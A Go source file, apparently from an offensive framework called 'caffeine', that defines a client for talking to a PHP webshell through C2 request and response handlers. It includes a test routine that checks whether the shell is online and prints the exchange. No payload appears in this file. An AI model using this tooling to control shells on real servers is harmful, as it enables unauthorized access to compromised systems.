package webshell

import (
	"caffeine/client/c2"
	"caffeine/core"
	"caffeine/server"
	"caffeine/server/php"
	"fmt"
	"time"
)

// 与WebShell通信
type WebClient struct {
	server          server.WebShellServer
	session         core.Session
	requestHandler  *c2.RequestHandler
	responseHandler *c2.ResponseHandler
	http            *core.HttpEngine
}

func NewWebClient(target core.Target, config c2.C2Yaml) *WebClient {
	return &WebClient{
		session: core.Session{
			ID:             core.GenerateID(),
			OperateHistory: nil,
			OutputHistory:  nil,
			StartTime:      time.Now(),
			LastActive:     time.Now(),
			Target:         target,
			Environment:    make(map[string]string),
		},
		server:          php.NewPHPWebShell(),
		requestHandler:  c2.NewRequestHandler(config),
		responseHandler: c2.NewResponseHandler(config),
		http:            core.GetHttpEngine(),
	}
}

func (client WebClient) GetPHPClient() *php.PHPWebshell {
	if shell, ok := client.server.(*php.PHPWebshell); ok {
		return shell
	}
	return nil
}

func (client *WebClient) Test() error {
	phpClient := client.GetPHPClient()
	online := phpClient.CheckOnline()
	req, err := client.requestHandler.Handler(client.session, online)
	if err != nil {
		return err
	}
	client.http.SubmitRequest(req)
	//TODO 等待
	time.Sleep(time.Second * 5)
	fmt.Println(string(req.Body))
	response := req.Response

	handler, err := client.responseHandler.Handler(client.session, response)
	if err != nil {
		return err
	}
	fmt.Println(string(handler))
	return nil
}
